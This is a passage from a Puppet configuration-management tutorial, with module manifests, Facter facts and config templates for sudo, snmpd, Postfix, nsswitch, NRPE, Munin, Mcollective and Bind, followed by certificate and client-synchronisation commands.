the files folder (here only sudoers):\ncp /etc/sudoers /etc/puppet/modules/sudo/files/sudoers cp /etc/sudoers /etc/puppet/modules/sudo/files/sudoers.solaris To keep it simple, I simply copied the sudoers from the server to the destination that corresponds to my config described above.\nIf you haven’t installed sudo on the server, put a sudoers file that suits you in /etc/puppet/modules/sudo/files/sudoers.\nIn future versions, puppet will support http and ftp protocols to fetch these files.\nsnmpd linkThe snmpd service is quite simple to use. That’s why this module is too :). Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/snmpd/{manifests,files} init.pp link /* Snmpd Module for Puppet Made by Pierre Mavro */ class snmpd { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include snmpd::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp link /* Snmpd Module for Puppet Made by Pierre Mavro */ class snmpd::redhat { # Install snmp packages package { 'net-snmp': ensure =\u003e present } # Snmpd config file file { \"/etc/snmp/snmpd.conf\": source =\u003e \"puppet:///modules/snmpd/snmpd.conf.$::operatingsystem\", mode =\u003e 644, owner =\u003e root, group =\u003e root, notify =\u003e Service[\"snmpd\"] } # Service should start on boot and be running service { 'snmpd': enable =\u003e true, ensure =\u003e running, require =\u003e File['/etc/snmp/snmpd.conf'] } } files linkAnd the configuration file:\n# Generated by Puppet ########################################################################### # # snmpd.conf # # - created by the snmpconf configuration program # ########################################################################### # SECTION: System Information Setup # # This section defines some of the information reported in # the \"system\" mib group in the mibII tree. # syslocation: The [typically physical] location of the system. # Note that setting this value here means that when trying to # perform an snmp SET operation to the sysLocation.0 variable will make # the agent return the \"notWritable\" error code. IE, including # this token in the snmpd.conf file will disable write access to # the variable. # arguments: location_string syslocation Unknown (edit /etc/snmp/snmpd.conf) # syscontact: The contact information for the administrator # Note that setting this value here means that when trying to # perform an snmp SET operation to the sysContact.0 variable will make # the agent return the \"notWritable\" error code. IE, including # this token in the snmpd.conf file will disable write access to # the variable. # arguments: contact_string syscontact Root (configure /etc/snmp/snmp.local.conf) ########################################################################### # SECTION: Access Control Setup # # This section defines who is allowed to talk to your running # snmp agent. # rocommunity: a SNMPv1/SNMPv2c read-only access community name # arguments: community [default|hostname|network/bits] [oid] rocommunity lookdeimos # # Unknown directives read in from other files by snmpconf # com2sec notConfigUser default public group notConfigGroup v1 notConfigUser group notConfigGroup v2c notConfigUser view systemview included .1.3.6.1.2.1.1 view systemview included .1.3.6.1.2.1.25.1.1 access notConfigGroup \"\" any noauth exact systemview none none dontLogTCPWrappersConnects yes Postfix linkFor postfix, we’ll use templates to facilitate certain configurations. If you need more information on how to configure Postfix, I recommend these documentations.\ninit.pp link /* Postix Module for Puppet Made by Pierre Mavro */ class postfix { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include postfix::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkI use transport maps here that need to be rebuilt if their configuration changes. That’s why we use ‘Subscribe’ in the ‘Exec’ directive:\n/* Postfix Module for Puppet Made by Pierre Mavro */ class postfix::redhat { # Install postfix packages package { 'postfix' : ensure =\u003e present } # Postfix main config file file { \"/etc/postfix/main.cf\" : content =\u003e template(\"postfix/main.cf.$::operatingsystem\"), mode =\u003e 644, owner =\u003e root, group =\u003e root, notify =\u003e Service[\"postfix\"] } # Postfix transport map file { \"/etc/postfix/transport\" : source =\u003e \"puppet:///modules/postfix/transport\", mode =\u003e 644, owner =\u003e root, group =\u003e root, notify =\u003e Service[\"postfix\"] } # Rebuild the transport map exec { 'build_transport_map' : command =\u003e \"/usr/sbin/postmap /etc/postfix/transport\", subscribe =\u003e File[\"/etc/postfix/transport\"], refreshonly =\u003e true } # Service should start on boot and be running service { 'postfix' : enable =\u003e true, ensure =\u003e running, require =\u003e File['/etc/postfix/main.cf'] } } templates linkHere I have my fqdn which is unique depending on the machine:\n# Generated by Puppet # Postfix directories queue_directory = /var/spool/postfix command_directory = /usr/sbin daemon_directory = /usr/libexec/postfix data_directory = /var/lib/postfix sendmail_path = /usr/sbin/sendmail.postfix newaliases_path = /usr/bin/newaliases.postfix mailq_path = /usr/bin/mailq.postfix # Inet configuration inet_interfaces = all inet_protocols = all # Reject unknow recipents unknown_local_recipient_reject_code = 550 # Do not set relayhost. Postfix must use transport_maps relayhost = # Destinations mydomain = deimos.fr myorigin = \u003c%= fqdn %\u003e mydestination = $myorigin, localhost.$mydomain, localhost # Transport_maps permits to route email using Google exchangers transport_maps = dbm:/etc/opt/csw/postfix/transport # Add TLS to emails if possible smtp_tls_security_level = may # Masquerade_domains hides hostnames from addresses masquerade_domains = $mydomain # Aliases alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases # SMTP banner smtpd_banner = $myhostname ESMTP $mail_name # Debug debug_peer_level = 2 debugger_command = PATH=/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin ddd $daemon_directory/$process_name $process_id \u0026 sleep 5 # Postfix rights mail_owner = postfix setgid_group = postdrop # Helps html_directory = no manpage_directory = /usr/share/man sample_directory = /usr/share/doc/postfix-2.6.6/samples readme_directory = /usr/share/doc/postfix-2.6.6/README_FILES files linkAnd in my files, I have my transport_map file:\ndeimos.fr :google.com .deimos.fr :google.com Nsswitch linkFor nsswitch, we’ll use an advanced technique which consists of using Facter (a built-in that saves a lot of time). Facter offers, in short, specific environment variables for Puppet which allow conditions to be made based on this. For example, I want to check for the presence of a file that will tell me if my server is in cluster mode (for Sun Cluster) or not and modify the nsswitch file accordingly. For this I’ll use facter.\nLet’s create the directory structure:\nmkdir -p /etc/puppet/modules/nsswitch/{manifests,lib/facter} facter linkLet’s create our fact file:\n# is_cluster.rb Facter.add(\"is_cluster\") do setcode do #%x{/bin/uname -i}.chomp FileTest.exists?(\"/etc/cluster/nodeid\") end end init.pp linkThen we’ll specify the use of a template:\nclass nsswitch { case $operatingsystem { Solaris: { include nsswitch::solaris } default: { } } } class nsswitch::solaris { $nsfilename = $operatingsystem ? { Solaris =\u003e \"/etc/nsswitch.conf\", default =\u003e \"/etc/nsswitch.conf\" } config_file { \"$nsfilename\": content =\u003e template(\"nsswitch/nsswitch.conf\"), } } templates linkAnd now the configuration file that will call the facter:\n# # Copyright 2006 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # # /etc/nsswitch.dns: # # An example file that could be copied over to /etc/nsswitch.conf; it uses # DNS for hosts lookups, otherwise it does not use any other naming service. # # \"hosts:\" and \"services:\" in this file are used only if the # /etc/netconfig file has a \"-\" for nametoaddr_libs of \"inet\" transports. # DNS service expects that an instance of svc:/network/dns/client be # enabled and online. passwd: files ldap group: files ldap # You must also set up the /etc/resolv.conf file for DNS name # server lookup. See resolv.conf(4). #hosts: files dns hosts: \u003c% if is_cluster -%\u003ecluster\u003c% end -%\u003e files dns # Note that IPv4 addresses are searched for in all of the ipnodes databases # before searching the hosts databases. #ipnodes: files dns #ipnodes: files dns [TRYAGAIN=0] ipnodes: files dns [TRYAGAIN=0 ] networks: files protocols: files rpc: files ethers: files #netmasks: files netmasks: \u003c% if is_cluster -%\u003ecluster\u003c% end -%\u003e files bootparams: files publickey: files # At present there isn't a 'files' backend for netgroup; the system will # figure it out pretty quickly, and won't use netgroups at all. netgroup: files automount: files aliases: files services: files printers: user files auth_attr: files prof_attr: files project: files tnrhtp: files tnrhdb: files Nagios NRPE + plugins linkYou must initialize the module before continuing.\ninit.pp linkLet’s say I have a folder of nagios plugins that I want to deploy everywhere. Sometimes I add them, I remove them, in short, I live my life with them and I want it to be fully synchronized. Here’s how:\n#nagios_plugins.pp class nrpe { # Copy conf and send checks include nrpe::common # Check operating system case $operatingsystem { Solaris: { include nrpe::service::solaris } default: { } } } class nrpe::common { class nrpe::configs { # Used for nrpe-deimos.cfg templates $nrpe_distrib = $operatingsystem ? { 'Solaris' =\u003e \"/opt/csw/libexec/nagios-plugins\", 'redhat' =\u003e \"/home/deimos/checks/nrpe_scripts\", 'debian' =\u003e \"/etc/nrpe\", } # Used for nrpe-deimos.cfg templates $deimos_script = $operatingsystem ? { 'Solaris' =\u003e \"/opt/deimos/libexec\", 'redhat' =\u003e \"/etc/nrpe.d\", 'debian' =\u003e \"/etc/nrpe\", } # Copy NRPE config file file { '/opt/csw/etc/nrpe.cfg': mode =\u003e 644, owner =\u003e root, group =\u003e root, content =\u003e template('nrpe/nrpe.cfg'), } ## Copy and adapt NRPE deimos Config file ## file { '/opt/csw/etc/nrpe-deimos.cfg': mode =\u003e 644, owner =\u003e root, group =\u003e root, content =\u003e template('nrpe/nrpe-deimos.cfg'), } } class nrpe::copy_checks { ## Copy deimos Production NRPE Checks ## file { \"nrpe_prod_checks\": name =\u003e $operatingsystem ? { 'Solaris' =\u003e \"/opt/deimos/libexec\", 'redhat' =\u003e \"/home/deimos/checks/nrpe_scripts\", 'debian' =\u003e \"/etc/nrpe\", }, ensure =\u003e directory, mode =\u003e 755, owner =\u003e root, group =\u003e root, sourceselect =\u003e all, source =\u003e $operatingsystem ? { 'Solaris' =\u003e [ \"puppet:///modules/nrpe/Nagios/nrpechecks/deimos\", \"puppet:///modules/nrpe/Nagios/nrpechecks/system\" ], recurse =\u003e true, force =\u003e true, ignore =\u003e '.svn' } } include nrpe::configs include nrpe::copy_checks } class nrpe::service::solaris { ## Check service and restart if needed file { '/var/svc/manifest/network/nagios-nrpe.xml': source =\u003e \"puppet:///modules/nrpe/nagios-nrpe.xml\", mode =\u003e 644, owner =\u003e root, group =\u003e sys, before =\u003e Service[\"svc:/network/cswnrpe:default\"] } # Restart service if smf xml has changed exec { \"`svccfg import /var/svc/manifest/network/nagios-nrpe.xml`\" : subscribe =\u003e File['/var/svc/manifest/network/nagios-nrpe.xml'], refreshonly =\u003e true } # Restart if one of those files have changed service { \"svc:/network/cswnrpe:default\": ensure =\u003e running, manifest =\u003e \"/var/svc/manifest/network/nagios-nrpe.xml\", subscribe =\u003e [ File['/opt/csw/etc/nrpe.cfg'], File['/opt/csw/etc/nrpe-deimos.cfg'] ] } } Here:\npurge allows to delete files that no longer exist recurse: recursive force: allows to force before: allows to be executed before something else subscribe: subscribes to a dependency with respect to the value of it refreshonly: refreshes only if there are changes With the subscribe, you can see here, we make lists like this: [ element_1, element_2, element_3… ]. However, small precision, the change operates (here a restart) only if one of the elements in the list is modified and not all.\nYou can also see from lines 54 to 56, we do multi sourcing which allows us to specify multiple sources and based on these to send to one place the content of these various files.\nfiles linkFor the file part, I linked with an external svn which allows me to free myself from the integration of plugins in the puppet part (which between us has nothing to do here).\ntemplates linkJust copy the nagios_plugins folder to files and make the templates here (I’ll only do the nrpe.cfg):\n... command[check_load]=\u003c%= nrpe_distrib %\u003e/check_load -w 15,10,5 -c 30,25,20 command[sunos_check_rss_mem]=\u003c%= deimos_script %\u003e/check_rss_mem.pl -w $ARG1$ -c $ARG2$ ... Munin linkDisclaimer: this work is mostly based upon DavidS work, available on his [git repo]. In the scope of my work I needed to have munin support for freeBSD \u0026 Solaris. I also wrote a class for snmp_plugins \u0026 custom plugins. Some things are quite dependant from my infrastructure, like munin.conf generation script but it can easily be adapted to yours, by extracting data from your CMDB.\nIt requires the munin_interfaces fact published here (and merged into DavidS repo, thanks to him), and [Volcane’s extlookup function] to store some parameters. Enough talking, this is the code:\n# Munin config class # Many parts taken from David Schmitt's http://git.black.co.at/ # FreeBSD \u0026 Solaris + SNMP \u0026 custom plugins support by Nicolas Szalay class munin::node { case $operatingsystem { openbsd: {} debian: { include munin::node::debian} freebsd: { include munin::node::freebsd} solaris: { include munin::node::solaris} default: {} } } class munin::node::debian { package { \"munin-node\": ensure =\u003e installed } file { \"/etc/munin\": ensure =\u003e directory, mode =\u003e 0755, owner =\u003e root, group =\u003e root; \"/etc/munin/munin-node.conf\": source =\u003e \"puppet://$fileserver/files/apps/munin/munin-node-debian.conf\", owner =\u003e root, group =\u003e root, mode =\u003e 0644, before =\u003e Package[\"munin-node\"], notify =\u003e Service[\"munin-node\"], } service { \"munin-node\": ensure =\u003e running } include munin::plugins::linux } class munin::node::freebsd { package { \"munin-node\": ensure =\u003e installed, provider =\u003e freebsd } file { \"/usr/local/etc/munin/munin-node.conf\": source =\u003e \"puppet://$fileserver/files/apps/munin/munin-node-freebsd.conf\", owner =\u003e root, group =\u003e wheel, mode =\u003e 0644, before =\u003e Package[\"munin-node\"], notify =\u003e Service[\"munin-node\"], } service { \"munin-node\": ensure =\u003e running } include munin::plugins::freebsd } class munin::node::solaris { # \"hand made\" install, no package. file { \"/etc/munin/munin-node.conf\": source =\u003e \"puppet://$fileserver/files/apps/munin/munin-node-solaris.conf\", owner =\u003e root, group =\u003e root, mode =\u003e 0644 } include munin::plugins::solaris } class munin::gatherer { package { \"munin\": ensure =\u003e installed } # custom version of munin-graph : forks \u0026 generates many graphs in parallel file { \"/usr/share/munin/munin-graph\": owner =\u003e root, group =\u003e root, mode =\u003e 0755, source =\u003e \"puppet://$fileserver/files/apps/munin/gatherer/munin-graph\", require =\u003e Package[\"munin\"] } # custon version of debian cron file. Month \u0026 Year cron are generated once daily file { \"/etc/cron.d/munin\": owner =\u003e root, group =\u003e root, mode =\u003e 0644, source =\u003e \"puppet://$fileserver/files/apps/munin/gatherer/munin.cron\", require =\u003e Package[\"munin\"] } # Ensure cron is running, to fetch every 5 minutes service { \"cron\": ensure =\u003e running } # Ruby DBI for mysql package { \"libdbd-mysql-ruby\": ensure =\u003e installed } # config generator file { \"/opt/scripts/muningen.rb\": owner =\u003e root, group =\u003e root, mode =\u003e 0755, source =\u003e \"puppet://$fileserver/files/apps/munin/gatherer/muningen.rb\", require =\u003e Package[\"munin\", \"libdbd-mysql-ruby\"] } # regenerate munin's gatherer config every hour cron { \"munin_config\": command =\u003e \"/opt/scripts/muningen.rb \u003e /etc/munin/munin.conf\", user =\u003e \"root\", minute =\u003e \"0\", require =\u003e File[\"/opt/scripts/muningen.rb\"] } include munin::plugins::snmp include munin::plugins::linux include munin::plugins::custom::gatherer } # define to create a munin plugin inside the right directory define munin::plugin ($ensure = \"present\") { case $operatingsystem { freebsd: { $script_path = \"/usr/local/share/munin/plugins\" $plugins_dir = \"/usr/local/etc/munin/plugins\" } debian: { $script_path = \"/usr/share/munin/plugins\" $plugins_dir = \"/etc/munin/plugins\" } solaris: { $script_path = \"/usr/local/munin/lib/plugins\" $plugins_dir = \"/etc/munin/plugins\" } default: { } } $plugin = \"$plugins_dir/$name\" case $ensure { \"absent\": { debug ( \"munin_plugin: suppressing $plugin\" ) file { $plugin: ensure =\u003e absent, } } default: { $plugin_src = $ensure ? { \"present\" =\u003e $name, default =\u003e $ensure } file { $plugin: ensure =\u003e \"$script_path/${plugin_src}\", require =\u003e Package[\"munin-node\"], notify =\u003e Service[\"munin-node\"], } } } } # snmp plugin define, almost same as above define munin::snmp_plugin ($ensure = \"present\") { $pluginname = get_plugin_name($name) case $operatingsystem { freebsd: { $script_path = \"/usr/local/share/munin/plugins\" $plugins_dir = \"/usr/local/etc/munin/plugins\" } debian: { $script_path = \"/usr/share/munin/plugins\" $plugins_dir = \"/etc/munin/plugins\" } solaris: { $script_path = \"/usr/local/munin/lib/plugins\" $plugins_dir = \"/etc/munin/plugins\" } default: { } } $plugin = \"$plugins_dir/$name\" case $ensure { \"absent\": { debug ( \"munin_plugin: suppressing $plugin\" ) file { $plugin: ensure =\u003e absent, } } \"present\": { file { $plugin: ensure =\u003e \"$script_path/${pluginname}\", require =\u003e Package[\"munin-node\"], notify =\u003e Service[\"munin-node\"], } } } } class munin::plugins::base { case $operatingsystem { debian: { $plugins_dir = \"/etc/munin/plugins\" } freebsd: { $plugins_dir = \"/usr/local/etc/munin/plugins\" } solaris: { $plugins_dir = \"/etc/munin/plugins\" } default: {} } file { $plugins_dir: source =\u003e \"puppet://$fileserver/files/empty\", ensure =\u003e directory, checksum =\u003e mtime, ignore =\u003e \".svn*\", mode =\u003e 0755, recurse =\u003e true, purge =\u003e true, force =\u003e true, owner =\u003e root } } class munin::plugins::interfaces { $ifs = gsub(split($munin_interfaces, \" \"), \"(.+)\", \"if_\\\\1\") $if_errs = gsub(split($munin_interfaces, \" \"), \"(.+)\", \"if_err_\\\\1\") plugin { $ifs: ensure =\u003e \"if_\"; $if_errs: ensure =\u003e \"if_err_\"; } include munin::plugins::base } class munin::plugins::linux { plugin { [ cpu, load, memory, swap, irq_stats, df, processes, open_files, ntp_offset, vmstat ]: ensure =\u003e \"present\" } include munin::plugins::base include munin::plugins::interfaces } class munin::plugins::nfsclient { plugin { \"nfs_client\": ensure =\u003e present } } class munin::plugins::snmp { # initialize plugins $snmp_plugins=extlookup(\"munin_snmp_plugins\") snmp_plugin { $snmp_plugins: ensure =\u003e present } # SNMP communities used by plugins file { \"/etc/munin/plugin-conf.d/snmp_communities\": owner =\u003e root, group =\u003e root, mode =\u003e 0644, source =\u003e \"puppet://$fileserver/files/apps/munin/gatherer/snmp_communities\" } } define munin::custom_plugin($ensure = \"present\", $location = \"/etc/munin/plugins\") { $plugin = \"$location/$name\" case $ensure { \"absent\": { file { $plugin: ensure =\u003e absent, } } \"present\": { file { $plugin: owner =\u003e root, mode =\u003e 0755, source =\u003e \"puppet://$fileserver/files/apps/munin/custom_plugins/$name\", require =\u003e Package[\"munin-node\"], notify =\u003e Service[\"munin-node\"], } } } } class munin::plugins::custom::gatherer { $plugins=extlookup(\"munin_custom_plugins\") custom_plugin { $plugins: ensure =\u003e present } } class munin::plugins::freebsd { plugin { [ cpu, load, memory, swap, irq_stats, df, processes, open_files, ntp_offset, vmstat ]: ensure =\u003e \"present\", } include munin::plugins::base include munin::plugins::interfaces } class munin::plugins::solaris { # Munin plugins on solaris are quite ... buggy. Will need rewrite / custom plugins. plugin { [ cpu, load, netstat ]: ensure =\u003e \"present\", } include munin::plugins::base include munin::plugins::interfaces } Munin Interfaces linkEveryone using puppet knows DavidS awesome git repository: git.black.co.at. Unfornately for me, his puppet infrastructure seems to be almost only linux based. I have different OS in mine, including FreeBSD \u0026 OpenSolaris. Looking at his module-munin I decided to reuse it (and not recreate the wheel) but he used a custom fact that needed some little work. So this is a FreeBSD \u0026 (Open)Solaris capable version, to know what network interfaces have link up.\n# return the set of active interfaces as an array # taken from http://git.black.co.at # modified by nico to add FreeBSD \u0026 Solaris support Facter.add(\"munin_interfaces\") do setcode do # linux if Facter.value('kernel') == \"Linux\" then `ip -o link show`.split(/\\n/).collect do |line| value = nil matches = line.match(/^\\d*: ([^:]*): \u003c(.*,)?UP(,.*)?\u003e/ if !matches.nil? value = matches[1] value.gsub!(/@.*/, '') end value end.compact.sort.join(\" \") #end # freebsd elsif Facter.value('kernel') == \"FreeBSD\" then Facter.value('interfaces').split(/,/).collect do |interface| status = `ifconfig #{interface} | grep status` if status != \"\" then status=status.strip!.split(\":\")[1].strip! if status == \"active\" then # I CAN HAZ LINK ? interface.to_a end end end.compact.sort.join(\" \") #end # solaris elsif Facter.value('kernel') == \"SunOS\" then Facter.value('interfaces').split(/,/).collect do |interface| if interface != \"lo0\" then # /dev/lo0 does not exists status = `ndd -get /dev/#{interface} link_status`.strip! if status == \"1\" # ndd returns 1 for link up, 0 for down interface.to_a end end end.compact.sort.join(\" \") end end end Mcollective linkMcollective is a bit like a gas plant, but it’s very powerful and works very well with Puppet. If you don’t know or want to learn more, follow this link.\nThis Mcollective module for Puppet allows you to install mcollective, as well as modules on the client side (Mcollective servers). With the modules, here’s what my directory structure looks like:\n. |-- files | |-- agent | | |-- filemgr.rb | | |-- nrpe.rb | | |-- package.rb | | |-- process.rb | | |-- puppetd.rb | | |-- service.rb | | `-- shell.rb | |-- facts | | `-- facter_facts.rb | `-- RedHat.server.cfg `-- manifests |-- common.pp |-- init.pp `-- redhat.pp For the modules (agents, facts), I invite you to look at my doc on Mcollective to know where to get them. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/mcollective/{manifests,files} init.pp linkThe init.pp file is the heart of our module, fill it in like this:\n/* Mcollective Module for Puppet Made by Pierre Mavro */ class mcollective { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include mcollective::redhat } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } common.pp link /* Mcollective Module for Puppet Made by Pierre Mavro */ class mcollective::common { # Used for nrpe.cfg file $mco_agent_dir = $operatingsystem ? { 'RedHat' =\u003e \"/usr/libexec/mcollective/mcollective\", 'Solaris' =\u003e \"/usr/libexec/mcollective/mcollective\" } # Transfert agents file { 'mco_agent_folder' : name =\u003e \"$mco_agent_dir/agent\", ensure =\u003e directory, mode =\u003e 644, owner =\u003e root, group =\u003e root, source =\u003e [\"puppet:///modules/mcollective/agent\"], recurse =\u003e true, ignore =\u003e '.svn', backup =\u003e false, notify =\u003e Service['mcollective'], require =\u003e Package['mcollective'] } # Transfert facts file { 'mco_facts_folder' : name =\u003e \"$mco_agent_dir/facts\", ensure =\u003e directory, mode =\u003e 644, owner =\u003e root, group =\u003e root, source =\u003e [\"puppet:///modules/mcollective/facts\"], recurse =\u003e true, ignore =\u003e '.svn', backup =\u003e false, notify =\u003e Service['mcollective'], require =\u003e Package['mcollective'] } } redhat.pp link /* Mcollective Module for Puppet Made by Pierre Mavro */ class mcollective::redhat { # Install Mcollective client package { [ 'mcollective', 'rubygem-stomp', 'rubygem-sysproctable' ]: ensure =\u003e 'installed' } # Be sure that service is set to start at boot and running service { 'mcollective' : enable =\u003e true, ensure =\u003e running } # Set configuration file file { '/etc/mcollective/server.cfg' : ensure =\u003e present, source =\u003e \"puppet:///modules/mcollective/${::osfamily}.server.cfg\", mode =\u003e 640, owner =\u003e root, group =\u003e root, notify =\u003e Service['mcollective'] } # Include common include mcollective::common } files linkRedHat.server.cfg linkHere’s the configuration for Mcollective:\n######################## # GLOCAL CONFIGURATION # ######################## topicprefix = /topic/ main_collective = mcollective collectives = mcollective libdir = /usr/share/mcollective/plugins logfile = /var/log/mcollective.log loglevel = info daemonize = 1 classesfile = /var/lib/puppet/classes.txt ########### # MODULES # ########### # Security securityprovider = psk plugin.psk = unset # Stomp connector = stomp plugin.stomp.host = mcollective.deimos.fr plugin.stomp.port = 61613 plugin.stomp.user = mcollective plugin.stomp.password = marionette # AgentPuppetd plugin.puppetd.puppetd = /usr/sbin/puppetd plugin.puppetd.lockfile = /var/lib/puppet/state/puppetdlock plugin.puppetd.statefile = /var/lib/puppet/state/state.yaml plugin.puppet.pidfile = /var/run/puppet/agent.pid plugin.puppetd.splaytime = 100 plugin.puppet.summary = /var/lib/puppet/state/last_run_summary.yaml ######### # FACTS # ######### factsource = facter plugin.yaml = /etc/mcollective/facts.yaml plugin.facter.facterlib = /var/lib/puppet/lib/facter fact_cache_time = 300 Bind linkIt can sometimes be useful to have a local DNS cache server to speed up certain processes and not be dependent on a third-party DNS if it fails for a few moments. For more info on Bind, follow this link. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/bind/{manifests,files,templates} init.pp link /* Bind Module for Puppet Made by Pierre Mavro */ class bind { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include ::bind::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp link /* Bind Module for Puppet Made by Pierre Mavro */ class bind::redhat { # Install bind package package { 'bind' : ensure =\u003e present } # resolv.conf file file { \"/etc/resolv.conf\" : source =\u003e \"puppet:///modules/bind/resolvconf\", mode =\u003e 744, owner =\u003e root, group =\u003e root, require =\u003e File['/etc/named.conf'] } # Bind main config file for cache server file { \"/etc/named.conf\" : content =\u003e template(\"bind/named.conf.$::operatingsystem\"), mode =\u003e 640, owner =\u003e root, group =\u003e named, notify =\u003e Service[\"named\"] } # Service should start on boot and be running service { 'named' : enable =\u003e true, ensure =\u003e running, require =\u003e [ Package['bind'], File['/etc/named.conf', '/etc/resolv.conf'] ] } } files linkWe’ll manage resolv.conf here:\n# Generated by Puppet domain deimos.fr search deimos.fr deimos.lan nameserver 127.0.0.1 templates linkAnd finally, the configuration of the template that will act with the information filled in vars.pp:\n// Generated by Puppet // // named.conf // // Provided by Red Hat bind package to configure the ISC BIND named(8) DNS // server as a caching only nameserver (as a localhost DNS resolver only). // // See /usr/share/doc/bind*/sample/ for example named configuration files. // options { listen-on port 53 { 127.0.0.1; }; listen-on-v6 port 53 { ::1; }; directory \"/var/named\"; dump-file \"/var/named/data/cache_dump.db\"; statistics-file \"/var/named/data/named_stats.txt\"; memstatistics-file \"/var/named/data/named_mem_stats.txt\"; allow-query { localhost; }; recursion yes; dnssec-enable no; dnssec-validation no; dnssec-lookaside auto; forwarders { \u003c% dns_servers.each do |dnsval| -%\u003e \u003c%= dnsval %\u003e; \u003c% end -%\u003e }; /* Path to ISC DLV key */ bindkeys-file \"/etc/named.iscdlv.key\"; managed-keys-directory \"/var/named/dynamic\"; }; logging { channel default_debug { file \"data/named.run\"; severity dynamic; }; }; zone \".\" IN { type hint; file \"named.ca\"; }; include \"/etc/named.rfc1912.zones\"; include \"/etc/named.root.key\"; Importing a module linkModules need to be imported into puppet for them to be handled. Here, we don’t have to worry about it because according to the server configuration we’ve made, it will automatically load the modules in /etc/puppet/modules. However, if you want to authorize module by module, you need to import them manually:\n# /etc/puppet/manifests/modules.pp import \"sudo\" import \"ssh\" WARNING\nBe careful because from the moment this is filled in, there’s no need to restart puppet for the changes to be taken into account. So you’ll need to be careful about what you make available at time t.\nImporting all modules at once linkThis can have serious consequences, but know that it’s possible to do it:\n# /etc/puppet/manifests/modules.pp import \"*.pp\" Usage linkCertificates linkPuppet works with certificates for client/server exchanges. So we’ll need to generate SSL keys on the server and then exchange with all clients. The use of SSL keys therefore requires a good configuration of your DNS server. So check that:\nThe server name is definitive The server name is accessible via puppet.mydomain.com (I’ll continue the configuration for myself with puppet-prd.deimos.fr) Creating a certificate link So we’ll create our certificate (normally already done when the installation is done on Debian): puppet cert generate puppet-prd.deimos.fr WARNING\nIt’s imperative that ALL names filled in the certificate are reachable otherwise clients won’t be able to synchronize with the server\nIf you want to validate a certificate with multiple domain names, you’ll need to proceed like this: puppet cert cert generate --dns_alt_names puppet:scar.deimos.fr puppet-prd.deimos.fr Insert the names you need one after the other. I remind you that by default, clients will look for **puppet.**mydomain.com, so don’t hesitate to add names if needed. You can then verify that the certificate contains both names:\n\u003e openssl x509 -text -in /var/lib/puppet/ssl/certs/puppet-prd.deimos.fr.pem | grep DNS DNS:puppet, DNS:scar.deimos.fr, DNS:puppet-prd.deimos.fr You can see possible certificate errors by connecting:\nopenssl s_client -host puppet -port 8140 -cert /path/to/ssl/certs/node.domain.com.pem -key /path/to/ssl/private_keys/node.domain.com.pem -CAfile /path/to/ssl/certs/ca.pem Note: Don’t forget to restart your web server if you change certificates\nAdding a puppet client to the server linkFor the certificate, it’s simple, we’ll make a certificate request:\n$ puppet agent --server puppet-prd.deimos.fr --waitforcert 60 --test notice: Ignoring cache info: Caching catalog at /var/lib/puppet/state/localconfig.yaml notice: Starting catalog run notice: //information_class/Exec[echo running on debian-puppet-prd.deimos.fr is a Debian with ip 192.168.0.106. Message is 'puppet c'est super']/returns: executed successfully notice: Finished catalog run in 0.45 seconds Now we’ll connect to the server and run this command:\n$ puppet cert -l debian-puppet-prd.deimos.fr Here I see, for example, that I have a host that wants to exchange keys in order to then obtain the configurations due to it. Only it needs to be authorized. To do this:\npuppet cert -s debian-puppet-prd.deimos.fr The machine is now accepted and can fetch configs from the Puppet server.\nIf you want to refuse a waiting node:\npuppet cert -c debian-puppet-prd.deimos.fr If you want to see the list of all authorized nodes, puppetmaster keeps them registered here:\n0x0001 2010-03-08T15:45:48GMT 2015-03-07T15:45:48GMT /CN=puppet-prd.deimos.fr 0x0002 2010-03-08T16:36:16GMT 2015-03-07T16:36:16GMT /CN=node1.deimos.fr 0x0003 2010-03-08T16:36:25GMT 2015-03-07T16:36:25GMT /CN=node2.deimos.fr 0x0004 2010-04-14T12:41:24GMT 2015-04-13T12:41:24GMT /CN=node3.deimos.fr Synchronizing a client linkNow that our machines are connected, we’ll want to synchronize them from time to time. Here’s how to do a manual synchronization from a client machine:\npuppet agent -t If you want to synchronize only one module, you can use the –tags option:\npuppet agent -t --tags module1 module2... Simulating linkIf you need to test before actually deploying, there’s the –noop option:\npuppet agent -t --noop You can also add the ‘audit’ directive in a manifest if you just want to audit a resource:\nfile { \"/etc/passwd\": audit =\u003e [ owner, mode ], } Here we ask to audit the user and the rights, but know that it’s possible to replace with ‘all’ to audit everything!\nRevoking a certificate link If you want to revoke a certificate, here’s how to proceed on the server: puppet cert clean my_machine Otherwise there’s this method: puppet cert -r my_machine puppet cert -c my_machine Simple, right? :-)\nIf you want to reassign again, delete the ssl folder on the client side in ‘/etc/puppet/’ or ‘/var/lib/puppet/’. Then you can restart a certificate request.\nRevoking all server certificates linkIf your puppet master is broken everywhere and you want to regenerate new keys and delete all the old ones:\npuppet cert clean --all rm -Rf /var/lib/puppet/ssl/certs/* /etc/init.d/puppetmaster restart Process monitoring linkOn clients, it’s not necessary to use monitoring software, since the puppetd daemons are only launched manually or by CRON task. On the server, it’s important that the puppetmaster process is always present. You can use the ‘monit’ software, which can automatically restart the process in case of problems.\nDetermining node status linkTo see if there are problems on a node, you can manually run the following command:\npuppetd --no-daemon --verbose --onetime If you want to know the last state/result of a puppet update, you can use the ‘report’ system once activated (on the clients):\n... report = true ... By enabling reporting, each time the puppetd daemon is executed, a report will be sent to the puppetmaster in a YAML format file, in the /var/lib/puppet/reports/MACHINE_NAME directory.\nHere’s an example of a report file, easily transformable into a dictionary with the yaml module of python (or ruby):\n--- !ruby/object:Puppet::Transaction::Report host: deb-puppet-client.deimos.fr logs: - !ruby/object:Puppet::Util::Log level: :info message: Applying configuration version '1275982371' 